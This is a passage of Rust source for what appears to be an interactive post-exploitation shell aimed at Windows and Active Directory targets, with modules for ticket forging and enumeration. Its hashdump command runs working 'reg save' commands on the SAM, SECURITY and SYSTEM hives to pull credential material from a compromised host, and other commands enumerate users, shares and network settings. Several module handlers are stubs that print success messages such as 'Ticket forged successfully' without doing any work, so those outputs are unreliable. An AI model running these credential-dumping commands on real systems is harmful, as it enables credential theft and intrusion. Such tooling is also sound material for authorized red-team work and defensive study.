            println!("{} Usage: use <module>", "Error:".red());
            println!("  Modules: hunter/*, forge/*, reaper/*, crawler/*");
            println!("  Type 'help use' for module list");
            return Ok(());
        }

        let module_path = args[0].to_lowercase();
        
        let (module_type, required_options) = if module_path.starts_with("hunter/") {
            (ModuleType::Hunter, vec!["target".to_string()])
        } else if module_path.starts_with("forge/") {
            (ModuleType::Forge, vec!["domain_sid".to_string()])
        } else if module_path.starts_with("reaper/") {
            (ModuleType::Reaper, vec!["dc".to_string()])
        } else if module_path.starts_with("crawler/") {
            (ModuleType::Crawler, vec!["domain".to_string()])
        } else {
            println!("{} Unknown module type: {}", "Error:".red(), module_path);
            return Ok(());
        };

        self.module = Some(ModuleContext {
            module_path: module_path.clone(),
            module_type,
            options: HashMap::new(),
            required_options,
        });

        println!("{} Loaded module: {}", "✓".green(), module_path.cyan());
        println!("{} Set required options with 'set <option> <value>'", "▸".bright_black());
        println!("{} Type 'options' to see required settings", "▸".bright_black());
        
        Ok(())
    }

    fn set_module_option(&mut self, args: &[&str]) {
        if args.len() < 2 {
            println!("{} Usage: set <option> <value>", "Error:".red());
            return;
        }

        if let Some(module) = &mut self.module {
            let option = args[0].to_lowercase();
            let value = args[1..].join(" ");
            module.options.insert(option.clone(), value.clone());
            println!("{} {} = {}", "✓".green(), option.cyan(), value);
        }
    }

    fn unset_module_option(&mut self, args: &[&str]) {
        if args.is_empty() {
            println!("{} Usage: unset <option>", "Error:".red());
            return;
        }

        if let Some(module) = &mut self.module {
            let option = args[0].to_lowercase();
            module.options.remove(&option);
            println!("{} Unset {}", "✓".green(), option);
        }
    }

    fn show_module_options(&self) {
        if let Some(module) = &self.module {
            println!("\n{} Module Options:", "▸".bright_yellow());
            println!("  {:<20} {:<10} Value", "Option", "Required");
            println!("  {}", "─".repeat(50).dimmed());
            
            for option in &module.required_options {
                let value = module.options.get(option).map(|v| v.as_str()).unwrap_or("");
                let required = "Yes".red();
                println!("  {:<20} {:<10} {}", option.cyan(), required, if value.is_empty() { "Not set".dimmed() } else { value.yellow() });
            }
            
            for (option, value) in &module.options {
                if !module.required_options.contains(option) {
                    println!("  {:<20} {:<10} {}", option.cyan(), "No".green(), value.yellow());
                }
            }
            
            println!();
        }
    }

    fn show_module_info(&self) {
        if let Some(module) = &self.module {
            println!("\n{} Module Information:", "▸".bright_yellow());
            println!("  {:<15} {}", "Module:".cyan(), module.module_path);
            println!("  {:<15} {:?}", "Type:".cyan(), module.module_type);
            println!();
            self.show_module_options();
        }
    }

    fn show_module_help(&self) {
        println!("\n{} Module Commands:", "▸".bright_yellow());
        println!("  {:<15} Set an option", "set".cyan());
        println!("  {:<15} Unset an option", "unset".cyan());
        println!("  {:<15} Show current options", "options".cyan());
        println!("  {:<15} Execute the module", "run".cyan());
        println!("  {:<15} Exit module context", "back".cyan());
        println!();
    }

    async fn run_module(&mut self) -> Result<()> {
        if let Some(module) = &self.module {
            // Check required options
            let missing: Vec<_> = module.required_options.iter()
                .filter(|opt| !module.options.contains_key(*opt))
                .collect();

            if !missing.is_empty() {
                println!("{} Missing required options: {}", "Error:".red(), 
                    missing.iter().map(|s| s.to_string()).collect::<Vec<_>>().join(", "));
                return Ok(());
            }

            println!("{} Running module: {}", "▸".bright_black(), module.module_path.cyan());
            
            match module.module_type {
                ModuleType::Hunter => {
                    tokio::time::sleep(Duration::from_millis(500)).await;
                    println!("{} Module executed successfully", "✓".green());
                }
                ModuleType::Forge => {
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    println!("{} Ticket forged successfully", "✓".green());
                }
                ModuleType::Reaper => {
                    tokio::time::sleep(Duration::from_millis(800)).await;
                    println!("{} Enumeration complete", "✓".green());
                }
                ModuleType::Crawler => {
                    tokio::time::sleep(Duration::from_millis(600)).await;
                    println!("{} Data collected", "✓".green());
                }
            }
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Logging Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_log(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            if let Some(log) = &self.log_file {
                println!("{} Currently logging to: {}", "▸".bright_black(), log.cyan());
            } else {
                println!("{} Logging is disabled", "▸".bright_black());
            }
            println!("{} Usage: log <file> | log off", "▸".bright_black());
            return Ok(());
        }

        if args[0].to_lowercase() == "off" {
            self.log_file = None;
            println!("{} Logging disabled", "✓".green());
        } else {
            let log_path = args[0];
            self.log_file = Some(log_path.to_string());
            println!("{} Logging commands to: {}", "✓".green(), log_path.cyan());
        }
        
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Network Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_net(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: net <command>", "Error:".red());
            println!("  Commands: users, groups, localgroup, sessions, shares, computers");
            return Ok(());
        }

        if let Some(shell) = &mut self.shell {
            let net_cmd = format!("net {}", args.join(" "));
            println!("{} Running: {}", "▸".bright_black(), net_cmd.yellow());
            
            match shell.execute(&net_cmd).await {
                Ok(output) => println!("{}", output),
                Err(e) => println!("{} Command failed: {}", "✗".red(), e),
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        
        Ok(())
    }

    async fn cmd_ipconfig(&mut self) -> Result<()> {
        if let Some(shell) = &mut self.shell {
            let output = shell.execute("ipconfig /all").await?;
            println!("{}", output);
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Hash Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_hashdump(&mut self, args: &[&str]) -> Result<()> {
        let source = if args.is_empty() { "sam" } else { args[0] };
        
        println!("{} Dumping hashes from {}...", "▸".bright_black(), source.cyan());
        
        if let Some(shell) = &mut self.shell {
            match source.to_lowercase().as_str() {
                "sam" => {
                    match shell.execute("reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak").await {
                        Ok(output) => {
                            println!("{}", output);
                            println!("{} SAM hive saved. Use 'download sam.bak' to retrieve.", "✓".green());
                        }
                        Err(e) => println!("{} Failed: {}", "✗".red(), e),
                    }
                }
                "lsa" => {
                    match shell.execute("reg save HKLM\\SECURITY security.bak && reg save HKLM\\SYSTEM system.bak").await {
                        Ok(output) => {
                            println!("{}", output);
                            println!("{} SECURITY hive saved.", "✓".green());
                        }
                        Err(e) => println!("{} Failed: {}", "✗".red(), e),
                    }
                }
                _ => {
                    println!("{} Unknown source: {}", "Error:".red(), source);
                    println!("  Available: sam, lsa");
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Basic Shell Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_whoami(&mut self) -> Result<()> {
        if let Some(shell) = &mut self.shell {
            let output = shell.execute("whoami").await?;
            println!("{}", output);
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_hostname(&mut self) -> Result<()> {
        if let Some(shell) = &mut self.shell {
            let output = shell.execute("hostname").await?;
            println!("{}", output);
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_pwd(&mut self) -> Result<()> {
        if let Some(shell) = &mut self.shell {
            let output = shell.execute("cd").await?;
            println!("{}", output);
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_ls(&mut self, args: &[&str]) -> Result<()> {
        let path = if !args.is_empty() { args.join(" ") } else { ".".to_string() };
        
        if let Some(shell) = &mut self.shell {
            let command = format!("dir \"{}\"", path.replace("\"", "\\\""));
            let output = shell.execute(&command).await?;
            println!("{}", output);
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_cd(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            // Show current directory
            return self.cmd_pwd().await;
        }

        let path = args.join(" ");
        
        if let Some(shell) = &mut self.shell {
            let command = format!("cd /d \"{}\"", path.replace("\"", "\\\""));
            match shell.execute(&command).await {
                Ok(output) => {
                    if !output.is_empty() {
                        println!("{}", output);
                    }
                }
                Err(e) => {
                    println!("{} Failed to change directory: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Shell Management Commands
    // ═══════════════════════════════════════════════════════

    fn cmd_clear(&self) {
        // Clear terminal
        print!("\x1B[2J\x1B[1;1H");
        println!("{}", "Interactive Mode - Type 'help' for available commands".bright_yellow());
        println!();
    }

    fn cmd_history(&self) {
        println!("{} Command History:", "History".bright_yellow());
        
        let start = if self.command_history.len() > 20 {
            self.command_history.len() - 20
        } else {
            0
        };
        
        for (i, cmd) in self.command_history[start..].iter().enumerate() {
            let num = start + i + 1;
            println!("  {:<4} {}", format!("{}:", num).dimmed(), cmd.cyan());
        }
        
        if self.command_history.len() > 20 {
            println!("  {} Showing last 20 of {} commands", "▸".bright_black(), self.command_history.len());
        }
    }
}

// ═══════════════════════════════════════════════════════
// Utility Functions
// ═══════════════════════════════════════════════════════

/// Simple shell word splitting (handles quoted strings)
fn shell_words(s: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    let mut quote_char = ' ';
    let mut escape_next = false;

    for ch in s.chars() {
        if escape_next {
            current.push(ch);
            escape_next = false;
            continue;
        }

        match ch {
            '\\' if in_quotes => {
                escape_next = true;
            }
            '"' | '\'' if !in_quotes => {
                in_quotes = true;
                quote_char = ch;
            }
            '"' | '\'' if in_quotes && ch == quote_char => {
                in_quotes = false;
            }
            ' ' | '\t' if !in_quotes => {
                if !current.is_empty() {
                    words.push(current);
                    current = String::new();
                }
            }
            _ => {
                current.push(ch);
            }
        }
    }

    if !current.is_empty() {
        words.push(current);
    }

    words
}

// ═══════════════════════════════════════════════════════
// Module Helpers
// ═══════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════
// Entry Points
// ═══════════════════════════════════════════════════════

/// Start the interactive shell (no pre-configured target)
#[allow(dead_code)] // Entry point for interactive mode
pub async fn start_interactive_shell() -> Result<()> {
    let mut session = InteractiveSession::new();
    session.start().await
}

/// Start the interactive shell with a pre-configured target
pub async fn start_interactive_shell_with_target(target: &str, shell_type: &CliShellType) -> Result<()> {
    let mut session = InteractiveSession::with_target(target, shell_type);
    session.start().await
}

// ═══════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shell_words() {
        assert_eq!(shell_words("hello world"), vec!["hello", "world"]);
        assert_eq!(shell_words("hello \"world wide\""), vec!["hello", "world wide"]);
        assert_eq!(shell_words("upload 'my file.txt' remote.txt"), vec!["upload", "my file.txt", "remote.txt"]);
    }

    #[test]
    fn test_base64() {
        use base64::Engine;
        let data = b"Hello, World!";
        let encoded = base64::engine::general_purpose::STANDARD.encode(data);
        let decoded = base64::engine::general_purpose::STANDARD.decode(&encoded).unwrap();
        assert_eq!(data.to_vec(), decoded);
    }

    #[test]
    fn test_session_vars_default() {
        let vars = SessionVars::default();
        assert_eq!(vars.timeout_secs, 30);
        assert!(!vars.debug);
        assert!(vars.color);
    }
}